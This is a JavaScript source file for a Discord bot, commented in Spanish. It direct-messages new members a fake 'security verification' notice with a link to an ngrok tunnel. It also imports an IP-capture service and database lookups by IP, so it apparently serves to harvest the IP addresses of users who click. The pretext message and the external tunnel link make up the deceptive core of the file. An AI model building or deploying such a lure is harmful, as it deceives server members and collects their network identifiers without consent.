import { Client, Events } from "discord.js";
import getIP from "./src/GetIP.js";
import { insertarDato, obtenerPorIP } from "./src/db/dbUtils.js";
import { readFileSync } from "fs";

// Ruta del archivo JSON
const configPath = new URL("../../config.json", import.meta.url);
const config = JSON.parse(readFileSync(configPath));

// crear un nuevo cliente de discord
const client = new Client({
    intents: 3276799 
});

const numero = Math.floor(Math.random() * 100000);
const ipService = new getIP(numero);

client.on(Events.ClientReady, async () => {
    console.log(`Conectado como ${client.user.username}!`);
});

// ################################################################
// ################################################################
// ################################################################

// cuando un usuario se una al servidor
client.on(Events.GuildMemberAdd, async (miembro) => {
    try {
        await generarMensaje(miembro.user);
    } catch (error) {
        console.log(`No se pudo enviar el mensaje a ${miembro.user.tag}:`, error);
    }
});

client.on(Events.MessageCreate, async (mensaje) => {
    if (mensaje.author.bot) return; 
    if(mensaje.content.toLowerCase() === "!mensaje") {
        try {
            mensaje = await generarMensaje(mensaje.author);
            setTimeout(() => {
                mensaje.delete().catch(console.error);
            }, 10000); // 10000 milisegundos = 10 segundos
        } catch (error) {
            console.log(`No se pudo enviar el mensaje a ${mensaje.author.tag}:`, error);
        }
    }
});

async function generarMensaje(author) {
    var mensajeVerificacion = "Hola, " + author.username + ". Para poder acceder al servidor tienes que verificarte, esto se hace por temas de seguridad y por el bienestar de la comunidad. \n" + await generarEnlaces();
    
    try {
        return await author.send(mensajeVerificacion);
    } catch (error) {
        console.log(`No se pudo enviar el mensaje a ${author.tag}:`, error);
    }
}

async function generarEnlaces() {
    var enlace = "https://7f3d-94-73-40-169.ngrok-free.app/" + numero;
    return enlace;
}

// Ejemplo de uso de las funciones de dbUtils.js
async function ejemploUsoDB() {
    // Insertar un dato
    await insertarDato("coleccionEjemplo", { campo: "valor" });

    // Obtener por IP
    const existe = await obtenerPorIP("127.0.0.1");
    console.log("Existe usuario con esa IP:", existe);
}

ejemploUsoDB();

// ################################################################
// ################################################################
// ################################################################

client.login(config.token);